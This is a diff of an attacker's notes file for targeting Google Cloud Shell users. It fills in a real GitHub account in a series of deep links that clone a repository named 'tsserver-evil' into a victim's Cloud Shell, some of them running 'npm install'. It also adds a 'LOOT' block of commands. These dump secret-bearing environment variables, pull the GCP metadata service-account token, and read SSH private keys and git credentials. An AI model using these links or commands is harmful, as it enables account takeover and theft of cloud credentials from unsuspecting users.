@@ -7,32 +7,47 @@
 # Replace ATTACKER with your GitHub username and tsserver-evil with your repo name.
 
 # Cloud Shell Editor (primary — opens the editor with the repo and file)
-https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_workspace=.
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_workspace=.
 
 # ─── VARIANT URLS ─────────────────────────────────────────────────────
 
 # Without workspace parameter (Cloud Shell auto-detects)
-https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts
 
 # Open in IDE with tutorial pane hidden
-https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_tutorial=
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_tutorial=
 
 # Cloud Shell terminal + editor (opens both)
-https://ssh.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
+https://ssh.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts
 
 # Legacy IDE deep link
-https://ide.cloud.google.com/?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
+https://ide.cloud.google.com/?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts
 
 # ─── WITH ADDITIONAL PARAMETERS ───────────────────────────────────────
 
 # With shell command (opening terminal with a specific command)
-https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_command=npm install
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_command=npm install
 
 # With specific git branch/tag
-https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_git_branch=main&cloudshell_open_in_editor=main.ts
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_git_branch=main&cloudshell_open_in_editor=main.ts
 
 # With ephemeral mode (if supported by newer Cloud Shell versions)
-https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&ephemeral=true
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts&ephemeral=true
+
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/nextep/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_command=npm install
+
+## LOOT
+
+whoami && hostname && pwd
+echo "---ENV---" && env | grep -iE 'GCLOUD|GOOGLE|GITHUB|TOKEN|SECRET|KEY|PASS|CRED|AUTH|SSH'
+echo "---METADATA---" && curl -s -H "Metadata-Flavor: Google"
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null
+echo "---SSH---" && cat ~/.ssh/id_* 2>/dev/null
+echo "---GIT---" && cat ~/.git-credentials 2>/dev/null
+echo "---WORKSPACE---" && ls -la ~/cloudshell_open/tsserver-evil/
+echo "---PROCESSES---" && ps aux | head -10
+echo "---NETWORK---" && ss -tlnp 2>/dev/null | head -10
+
 
 # ─── SHORTENED / OBFUSCATED ──────────────────────────────────────────
 
